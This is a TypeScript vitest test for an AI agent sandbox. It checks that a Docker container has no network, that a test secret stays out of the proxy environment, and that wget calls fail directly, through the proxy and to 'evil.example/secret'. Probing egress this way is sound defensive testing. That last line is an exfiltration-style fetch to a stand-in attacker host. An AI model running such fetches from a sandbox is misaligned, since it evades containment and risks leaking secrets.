import { execFile, execFileSync } from "node:child_process";
import http from "node:http";
import { promisify } from "node:util";
import { afterEach, describe, expect, it } from "vitest";
import { createDockerSandbox, type Sandbox } from "@agenttag/sandbox";
import { startAgentProxy, type AgentProxy } from "./server.ts";

const execFileAsync = promisify(execFile);
const SECRET = "tok_test_not_for_sandbox";

function dockerDaemonUp(): boolean {
  try {
    execFileSync("docker", ["info"], { stdio: "ignore" });
    return true;
  } catch {
    return false;
  }
}

const describeDocker = dockerDaemonUp() ? describe : describe.skip;

describeDocker("sandbox HTTP_PROXY egress", () => {
  const boxes: Sandbox[] = [];
  const proxies: AgentProxy[] = [];
  const closers: Array<() => Promise<void>> = [];

  afterEach(async () => {
    await Promise.all(boxes.splice(0).map((box) => box.destroy().catch(() => undefined)));
    await Promise.all(proxies.splice(0).map((proxy) => proxy.close()));
    await Promise.all(closers.splice(0).map((close) => close()));
  });

  it("denies in-container wget even with HTTP_PROXY because the sandbox has no network", async () => {
    const hits: string[] = [];
    const upstream = http.createServer((req, res) => {
      hits.push(req.url ?? "");
      res.writeHead(200, { "content-type": "text/plain" });
      res.end("from-upstream");
    });
    await new Promise<void>((resolve) => upstream.listen(0, "0.0.0.0", resolve));
    closers.push(
      () =>
        new Promise((resolve, reject) => {
          upstream.close((err) => (err ? reject(err) : resolve()));
        }),
    );
    const addr = upstream.address();
    if (!addr || typeof addr === "string") {
      throw new Error("upstream address missing");
    }

    const proxy = await startAgentProxy({
      bundle: { allowedHosts: ["127.0.0.1"], connections: [] },
      secrets: { unused: SECRET },
      host: "0.0.0.0",
      port: 0,
    });
    proxies.push(proxy);

    const sandbox = await createDockerSandbox({
      sessionId: "sess_proxy_egress",
      image: "alpine:3.20",
      httpProxyUrl: `http://host.docker.internal:${proxy.port}`,
    });
    boxes.push(sandbox);

    const { stdout } = await execFileAsync("docker", ["inspect", sandbox.id], { encoding: "utf8" });
    const inspect = JSON.parse(stdout) as Array<{ HostConfig?: { NetworkMode?: string } }>;
    expect(inspect[0]?.HostConfig?.NetworkMode).toBe("none");

    const env = await sandbox.exec("printenv HTTP_PROXY || true");
    expect(env.stdout).not.toContain(SECRET);

    const allowed = await sandbox.exec(`wget -qO- -T 2 http://127.0.0.1:${addr.port}/health`);
    expect(allowed.code).not.toBe(0);
    expect(allowed.stdout).not.toContain("from-upstream");

    const viaProxy = await sandbox.exec(
      `wget -qO- -T 2 -e http_proxy=http://host.docker.internal:${proxy.port} http://127.0.0.1:${addr.port}/health`,
    );
    expect(viaProxy.code).not.toBe(0);

    const blocked = await sandbox.exec("wget -qO- -T 2 http://evil.example/secret");
    expect(blocked.code).not.toBe(0);
    const blob = `${allowed.stdout}\n${allowed.stderr}\n${viaProxy.stdout}\n${viaProxy.stderr}\n${blocked.stdout}\n${blocked.stderr}`;
    expect(blob).not.toContain(SECRET);
    expect(hits).toEqual([]);
  });
});
